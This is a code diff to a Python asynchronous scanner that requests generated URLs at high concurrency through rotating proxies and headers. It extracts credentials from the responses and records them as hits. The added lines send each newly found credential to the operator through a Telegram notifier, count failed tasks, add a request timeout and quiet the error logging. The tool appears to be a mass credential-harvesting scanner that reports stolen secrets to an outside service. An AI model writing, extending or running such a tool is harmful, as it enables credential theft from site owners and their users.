@@ -50,7 +50,7 @@ class ScanStats:
 class Scanner:
     """Multi-threaded scanner with advanced capabilities"""
     
-    def __init__(self, threads: int = 1000, timeout: int = None, network_manager=None):
+    def __init__(self, threads: int = 1000, timeout: int = None, network_manager=None, telegram_notifier=None):
         # Handle unlimited values
         if threads is None or threads == 0:
             self.threads = 1000  # High default for unlimited
@@ -64,6 +64,7 @@ class Scanner:
             
         self.logger = Logger()
         self.network_manager = network_manager or NetworkManager()
+        self.telegram = telegram_notifier
         
         # Scanning state
         self.processed_urls: Set[str] = set()
@@ -141,16 +142,21 @@ class Scanner:
             for task in asyncio.as_completed(tasks):
                 try:
                     result = await task
+                    # Always increment processed count (regardless of success/failure)
+                    self.stats.total_processed += 1
+                    
                     if result:
                         self.results.append(result)
                         self._extract_credentials(result)
-                        self.stats.total_processed += 1
                         
-                        # Update progress
-                        if progress_display:
-                            progress_display.update_stats(self.stats)
+                    # Update progress after each URL
+                    if progress_display:
+                        progress_display.update_stats(self.stats)
                             
                 except Exception as e:
+                    self.stats.total_processed += 1  # Count failed tasks too
+                    if progress_display:
+                        progress_display.update_stats(self.stats)
                     self.logger.error(f"Task failed: {e}")
         
         # Calculate final statistics
@@ -199,16 +205,21 @@ class Scanner:
             for task in asyncio.as_completed(tasks):
                 try:
                     result = await task
+                    # Always increment processed count (regardless of success/failure)
+                    self.stats.total_processed += 1
+                    
                     if result:
                         self.results.append(result)
                         self._extract_credentials(result)
-                        self.stats.total_processed += 1
                         
-                        # Update progress
-                        if progress_display:
-                            progress_display.update_stats(self.stats)
+                    # Update progress after each URL
+                    if progress_display:
+                        progress_display.update_stats(self.stats)
                             
                 except Exception as e:
+                    self.stats.total_processed += 1  # Count failed tasks too
+                    if progress_display:
+                        progress_display.update_stats(self.stats)
                     self.logger.error(f"Task failed: {e}")
         
         # Calculate final statistics
@@ -229,13 +240,14 @@ class Scanner:
                 headers = self.network_manager.get_headers()
                 proxy = self.network_manager.get_proxy()
                 
-                # Make request
+                # Make request with timeout
                 async with session.get(
                     url,
                     headers=headers,
                     proxy=proxy,
                     allow_redirects=True,
-                    max_redirects=3
+                    max_redirects=3,
+                    timeout=aiohttp.ClientTimeout(total=10)  # 10 second timeout
                 ) as response:
                     content = await response.text()
                     response_time = time.time() - start_time
@@ -252,10 +264,10 @@ class Scanner:
                     return result
                     
             except asyncio.TimeoutError:
-                self.logger.warning(f"Timeout scanning {url}")
+                self.logger.debug(f"Timeout scanning {url}")
                 return None
             except Exception as e:
-                self.logger.warning(f"Error scanning {url}: {e}")
+                self.logger.debug(f"Error scanning {url}: {e}")
                 return None
     
     def _generate_urls(self, targets: List[str]) -> List[str]:
@@ -311,6 +323,10 @@ class Scanner:
                 
                 result.credentials.append(credential)
                 self.stats.credentials.append(credential)
+                
+                # Send Telegram notification for new hit
+                if self.telegram:
+                    asyncio.create_task(self.telegram.notify_hit_found(credential))
     
     def _get_context(self, content: str, start: int, end: int, context_size: int = 50) -> str:
         """Get context around a match"""
